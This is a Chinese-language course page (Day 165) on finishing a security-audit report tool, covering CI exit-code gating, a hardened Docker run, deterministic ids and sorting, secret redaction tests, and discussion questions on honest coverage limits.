+<pre class="plain"><code>   门禁　：--fail-on high → 命中 4 条
+      · [critical] WEB-SQLI-ERROR @ http://127.0.0.1:8080/item?id=1
+      · [high] TRAFFIC-CLEARTEXT-CRED @ http://127.0.0.1:8080/login
+      · [high] WEB-XSS-REFLECTED @ http://127.0.0.1:8080/search?q=
+      · [high] TRAFFIC-SUSPICIOUS-UA @ 127.0.0.1:9000
+⛔ 门禁拦截：存在达到阈值的发现
+exit=1
+</code></pre>
+<p>注意最后一行里 <strong><code>TRAFFIC-SUSPICIOUS-UA</code> 是 low 置信度的</strong>，<br>
+但它依然被 <code>--fail-on high</code> 拦截。这看起来和 2.7 节"低置信度应该下沉"矛盾？</p>
+<p><strong>不矛盾，但确实是一个真实的取舍</strong>：<br>
+- 风险分（排序）回答"先看哪个"<br>
+- 门禁阈值（拦截）回答"能不能放过"</p>
+<p>门禁用的是<strong>原始 severity</strong>，不看置信度，因为：<br>
+门禁一旦引入置信度折扣，就会出现"低置信度高危可以合法放过"的口子，<br>
+而低置信度往往只是"证据不完美"，不代表"不是真的"。</p>
+<p>正确的做法是：<strong>门禁看 severity 严卡，人工看 risk 排序排优先级</strong>。<br>
+如果确实要豁免，应该在流程里显式记录豁免原因，而不是把阈值调松。</p>
+<h3 id="64-c">6.4 场景 C：四种退出码全部实测</h3>
+<pre class="plain"><code>exit=0  --allow-coverage-gaps --fail-on 未设   → 通过
+exit=1  --fail-on high（命中 4 条）            → 门禁拦截
+exit=2  --input nope.json                      → ❌ 输入错误：输入文件不存在
+exit=3  容器内写 /out（宿主目录属 root）        → ❌ 写盘失败：Permission denied
+exit=4  --fail-on &quot;&quot; 且存在 gaps               → ⚠️ 覆盖缺口，结论不完整
+</code></pre>
+<p>五种码逐个实测过，这是本课最硬的交付证据之一。<br>
+同时注意 <code>exit=3</code> 是在 Docker 场景下真实发生的（见 7.3），<br>
+<strong>不是我编出来的一个示例</strong>。</p>
+<h3 id="65-d">6.5 场景 D：容器里跑完整流水线</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nb">cd</span><span class="w"> </span>code
+docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>audit-toolbox:1.0<span class="w"> </span>.
+
+mkdir<span class="w"> </span>-p<span class="w"> </span>out<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chown<span class="w"> </span><span class="m">10001</span>:10001<span class="w"> </span>out<span class="w">      </span><span class="c1"># ← 关键一步（否则 exit=3）</span>
+
+docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>--network<span class="w"> </span>none<span class="w"> </span>--read-only<span class="w"> </span>--tmpfs<span class="w"> </span>/tmp:size<span class="o">=</span>16m<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--cap-drop<span class="w"> </span>ALL<span class="w"> </span>--security-opt<span class="w"> </span>no-new-privileges<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-v<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/findings.example.json:/data/findings.json:ro&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-v<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/out:/out&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>audit-toolbox:1.0<span class="w"> </span>--input<span class="w"> </span>/data/findings.json<span class="w"> </span>--format<span class="w"> </span>all<span class="w"> </span>--out-dir<span class="w"> </span>/out<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--generated-at<span class="w"> </span><span class="m">2026</span>-09-24T06:00:00+08:00<span class="w"> </span>--allow-coverage-gaps
+</code></pre></div>
+<p>实测（修好权限后）：</p>
+<pre class="plain"><code>   ✅ 已写入 /out/day165-docker.md（4431 字节）
+   ✅ 已写入 /out/day165-docker.json（5317 字节）
+   ✅ 已写入 /out/day165-docker.html（5531 字节）
+   ✅ 已写入 /out/day165-docker.sarif（10371 字节）
+✅ 通过
+exit=0
+</code></pre>
+<h3 id="66">6.6 代码里最值得抄走的三个片段</h3>
+<p><strong>（1）稳定 id（三行解决 diff 问题）</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">def</span> <span class="nf">stable_id</span><span class="p">(</span><span class="o">*</span><span class="n">parts</span><span class="p">:</span> <span class="n">Any</span><span class="p">,</span> <span class="n">length</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">12</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">joined</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x1f</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span> <span class="k">if</span> <span class="n">p</span> <span class="ow">is</span> <span class="kc">None</span> <span class="k">else</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">joined</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="n">length</span><span class="p">]</span>
+</code></pre></div>
+<p>用 <code>\x1f</code>（单元分隔符）拼接而不是普通空格：<br>
+因为 <code>("a b", "c")</code> 和 <code>("a", "b c")</code> 用空格拼出来是同一个字符串，<br>
+用控制字符就能避开这种边界碰撞。</p>
+<p><strong>（2）全序排序键（确定性最后一道锁）</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">def</span> <span class="nf">sort_key</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">SEVERITY_ORDER</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">severity</span><span class="p">],</span> <span class="o">-</span><span class="bp">self</span><span class="o">.</span><span class="n">risk</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">rule_id</span><span class="p">)</span>
+</code></pre></div>
+<p>末位 <code>rule_id</code> 看似多余，实际是防"前三维相等时退化成输入顺序"的保险丝。</p>
+<p><strong>（3）空值也要显式渲染</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">else</span><span class="p">:</span>
+    <span class="n">lines</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;**证据**：（无证据，属建议项）&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>不能因为证据为空就跳过这一行：跳过之后读者会以为"渲染器漏了"，<br>
+而写明白才能传递"这条本来就是建议，不是发现"。</p>
+<hr>
+<h2 id="7">7. 真机实测验证（不是示例输出，是跑出来的）</h2>
+<p>本课所有代码与容器配置都在本机（Linux / Python 3.12 / Docker）实际执行过。<br>
+以下记录原始结果，包括一次真实的翻车。</p>
+<h3 id="71">7.1 构建</h3>
+<pre class="plain"><code>Step 18/18 : CMD [&quot;--input&quot;, &quot;/data/findings.json&quot;, &quot;--format&quot;, &quot;all&quot;, &quot;--out-dir&quot;, &quot;/out&quot;]
+Successfully built 8f47278aa60d
+Successfully tagged audit-toolbox:1.0
+build_exit=0
+</code></pre>
+<h3 id="72">7.2 镜像体积（分层收益）</h3>
+<pre class="plain"><code>python:3.12-slim（基础）           179 MB
+audit-toolbox:1.0（我们的）        194 MB   ← 只多出约 15 MB
+</code></pre>
+<h3 id="73-root-eacces">7.3 翻车记录：非 root + 绑定挂载 = EACCES</h3>
+<pre class="plain"><code>📄 报告：安全审计报告
+   摘要　：findings=7 critical=1 high=3 medium=1 low=1 info=1 risk=105 gaps=4
+   时间戳：2026-09-24T06:00:00+08:00
+❌ 写盘失败：[Errno 13] Permission denied: &#x27;/out/day165-docker.md&#x27;
+exit=3
+</code></pre>
+<p>排查（两句命令）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>--entrypoint<span class="w"> </span>id<span class="w"> </span>audit-toolbox:1.0
+<span class="c1"># → uid=10001(app) gid=10001(app) groups=10001(app)</span>
+
+ls<span class="w"> </span>-ld<span class="w"> </span>out/
+<span class="c1"># → drwxr-xr-x root root     ← 10001 写不进去</span>
+</code></pre></div>
+<p>修复后（<code>chown 10001:10001 out</code>）四个格式全部写出，退出码 <code>0</code>。<br>
+<strong>详细的三重根因与三种修法见 3.8 节</strong>。这次翻车完整验证了退出码 3 的设计价值。</p>
+<h3 id="74">7.4 门禁在容器里的退出码透传</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">docker<span class="w"> </span>run<span class="w"> </span>…<span class="w"> </span>audit-toolbox:1.0<span class="w"> </span>--input<span class="w"> </span>/data/findings.json<span class="w"> </span>--format<span class="w"> </span>json<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--fail-on<span class="w"> </span>high<span class="w"> </span>--generated-at<span class="w"> </span>fixed<span class="w"> </span>--allow-coverage-gaps
+<span class="nv">exit</span><span class="o">=</span><span class="m">1</span><span class="w">        </span><span class="c1"># ← 与本地运行完全一致</span>
+</code></pre></div>
+<p>这一条是 exec 形式 ENTRYPOINT 的直接证据。<br>
+如果换成 shell 形式（<code>ENTRYPOINT python …</code>），退出码会被 <code>/bin/sh</code> 包一层，<br>
+CI 里的门禁就不再可靠。</p>
+<h3 id="75">7.5 脱敏实测（含一次修复）</h3>
+<pre class="plain"><code>&#x27;Authorization: Bearer abcdefgh12345&#x27;   -&gt; &#x27;Authorization: &lt;REDACTED&gt;&#x27;
+&#x27;password=abc123; token=xyz987&#x27;         -&gt; &#x27;password=&lt;REDACTED&gt;; token=&lt;REDACTED&gt;&#x27;
+&#x27;http://alice:qwerty9876@example.com/x&#x27; -&gt; &#x27;http://&lt;REDACTED&gt;:&lt;REDACTED&gt;@example.com/x&#x27;
+Cookie: sid=deadbeef; theme=dark        -&gt; &#x27;Cookie: &lt;REDACTED&gt;&#x27;
+</code></pre>
+<p>每条都验证了<strong>幂等</strong>（二次脱敏与一次相同）。<br>
+第一版规则写成 <code>\S+</code> 时，<code>Authorization: Bearer zzz</code> 会被擦成<br>
+<code>Authorization: &lt;REDACTED&gt; zzz</code>——令牌尾巴漏出去了。<br>
+改成<strong>吃到行尾</strong>（<code>[^\r\n]+</code>）才修好。这就是 5.6 节铁律第 3 条的来历。</p>
+<h3 id="76">7.6 确定性实测</h3>
+<pre class="plain"><code>两次渲染是否字节一致：True
+顺序 A：[&#x27;R-SQLI&#x27;, &#x27;R-CLEARTEXT&#x27;, &#x27;R-OPEN-PORT&#x27;]
+顺序 B：[&#x27;R-SQLI&#x27;, &#x27;R-CLEARTEXT&#x27;, &#x27;R-OPEN-PORT&#x27;]    ← 输入完全反序，输出相同
+已修复（old - new）：[&#x27;fd50b189af15&#x27;]
+新增　（new - old）：[]
+</code></pre>
+<h3 id="77">7.7 脱敏顺序实测（误报实证）</h3>
+<pre class="plain"><code>[正确顺序] 凭证复用命中：（无）                 ← 两个不同口令，不误报
+[错误顺序] 指纹：[&#x27;sha256:70de1811/len=25&#x27;, &#x27;sha256:70de1811/len=25&#x27;]
+[错误顺序] 凭证复用命中：{&#x27;…&#x27;: {&#x27;bob&#x27;, &#x27;alice&#x27;}}  ← 两个不同口令被擦成同一个 → 误报
+</code></pre>
+<p>这一条比任何文字论证都有说服力：<strong>过度脱敏会制造误报</strong>，<br>
+而误报比漏报更容易骗过只看告警数量的人。</p>
+<h3 id="78">7.8 一个诚实的遗留项</h3>
+<p><code>out/</code> 与 <code>tools/</code> 已在 <code>.gitignore</code> 中：前者是运行产物（可随时重生成），<br>
+后者含本地进度数据。所以本课提交的是<strong>可重跑的代码与配置</strong>，<br>
+而不是产物快照。这也符合 2.5 节的原则：<br>
+应该提交的是"能生产"，而不是"生产出来的那一份"（后者只有确定性地生成才有意义）。</p>
+<hr>
+<h2 id="8">8. 思考题</h2>
+<p>每道题都请写出<strong>理由</strong>，不要只写结论。</p>
+<h3 id="1-datetimenow">思考 1：为什么报告层不能用 <code>datetime.now()</code>？</h3>
+<p>请顺着链条推：不确定的时间戳 → 报告每吹不同 → <code>git diff</code> 失效 → …… →<br>
+最后会影响哪一个业务能力？（提示：从“回归对比”推到“审计结论能不能被复核”。）</p>
+<blockquote>
+<p>参考方向：报告一旦不可复现，别人就无法验证你的结论，<br>
+审计就从“可复核的证据”退化成“一张截图”。</p>
+</blockquote>
+<h3 id="2-target-rule_id-severity">思考 2：如果两个不同的问题碰巧有相同的 <code>(target, rule_id, severity)</code>，会怎样？</h3>
+<p>本课的 id 只由这三个字段组成。请找出一个真实场景能造成这种碰撞，<br>
+并给出一个修法（同时<strong>保住</strong>“改文案不换 id”这个优点）。</p>
+<blockquote>
+<p>参考方向：同一 URL 上同一规则命中两次（例如两个不同参数都触发了 XSS）。<br>
+修法：把“定位到具体位置”的信息（参数名/行号）加进 id，<br>
+但保持 <code>title</code>/<code>reason</code> <strong>不</strong>入哈希。</p>
+</blockquote>
+<h3 id="3html-htmlescape">思考 3：HTML 渲染为什么必须 <code>html.escape()</code>？举一个具体攻击路径</h3>
+<p>本题是安全的重点。请完整写出：<br>
+（a）被审计目标返回了什么；（b）报告怎么把它带进去；<br>
+（c）谁会被成功攻击；（d）多了一层什么防护就能阻断。</p>
+<blockquote>
+<p>参考方向：见 3.6 节。关键认识是：<strong>审计工具处理的是不可信输入</strong>。<br>
+一个功能正常的“报告预览”界面就足以把存储型 XSS 送到审计员浏览器里。</p>
+</blockquote>
+<h3 id="4-4-0">思考 4：为什么退出码 4（覆盖缺口）不能和 0（通过）合并？</h3>
+<p>请从“行动项”角度回答，而不是从“返回值”角度。<br>
+如果一个 CI 流水线把 4 当成 0 处理，长期会发生什么？</p>
+<blockquote>
+<p>参考方向：把“没测到”当成“没问题”，于是“什么都测不到”的配置<br>
+会看起来永远绿灯。这是审计工具最危险的失败模式。</p>
+</blockquote>
+<h3 id="5-severity">思考 5：门禁用原始 severity，排序用风险分——为什么不统一成一套？</h3>
+<p>如果你强行把两者统一（比如门禁也乘置信度系数），会出现什么后果？<br>
+请举出一个具体的“不该放过但会被放过”的例子。</p>
+<blockquote>
+<p>参考方向：见 6.3 节。低置信度 high 在风险分里是 7（比 medium 还低），<br>
+如果门禁用风险分，那么“证据不完美的高危”就会被合法放过。<br>
+门禁与排序回答的是两个不同问题：<strong>能不能放过 vs 先看哪个</strong>。</p>
+</blockquote>
+<hr>
+<h2 id="9">9. 收官：四天项目的一句话总结</h2>
+<pre class="plain"><code>Day 162  资产面   →  有哪些东西存在
+Day 163  漏洞面   →  它们有什么弱点
+Day 164  流量面   →  网络上实际发生了什么（且秘密不落盘）
+Day 165  产出面   →  变成可交付、可复核、可门禁的证据链
+</code></pre>
+<p>如果现在有人问你“你这个工具能保证我的系统安全吗？”，<br>
+诚实的回答包含三件事：<strong>不能保证</strong>（只覆盖测过的范围）、<br>
+<strong>覆盖缺口在哪</strong>（主动说出盲区）、<strong>结论有边界</strong>（未发现 ≠ 没有）。</p>
+<blockquote>
+<p>一个声称“保证安全”的安全工具，要么在说谎，要么在把责任转移给使用者。<br>
+<strong>一个诚实的工具的标配，是把自己的边界说清楚。</strong><br>
+这句话是这四天里比任何一行代码都重要的东西。</p>
+</blockquote>
+<hr>
+<p><strong>下一天</strong>：Day 166 — 系统监控（psutil）。<br>
+从“审计别人的系统”转向“保护自己的系统”：<br>
+CPU / 内存 / 磁盘 / 网络监控、进程管理、系统信息采集，以及一个可用的监控脚本。</p>
+  </main>
+</div>
+
+<nav class="pager">
+  <a class="nav-prev" href="../day-164/index.html">← Day 164 阶段项目（三）：安全审计工具箱 · 代理中间人 + 流量分析</a><a class="nav-next" href="../day-166/index.html">Day 166 系统监控（psutil） →</a>
+</nav>
+
+<script src="../assets/mermaid.min.js"></script>
+<script>
+if (window.mermaid) {
+  mermaid.initialize({ startOnLoad: true, securityLevel: 'loose', theme: 'default' });
+}
+function copyCode(btn) {
+  var pre = btn.closest('.codeblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(function () {
+    var o = btn.textContent; btn.textContent = '已复制';
+    setTimeout(function () { btn.textContent = o; }, 1500);
+  });
+}
+</script>
+</body>
+</html>
